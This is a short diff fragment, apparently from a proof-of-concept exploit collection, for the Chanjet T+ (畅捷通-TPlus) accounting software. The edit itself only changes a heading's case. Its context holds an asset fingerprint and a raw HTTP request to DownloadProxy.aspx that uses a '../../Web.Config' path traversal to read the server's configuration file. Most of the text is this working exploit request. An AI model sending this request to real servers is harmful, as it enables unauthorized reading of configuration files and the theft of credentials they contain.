@@ -6,7 +6,7 @@ app="畅捷通-TPlus"
 ```
 
 
-## poc
+## POC
 ```
 GET /tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config HTTP/1.1
 X-Ajaxpro-Method: GetStoreWarehouseByStore
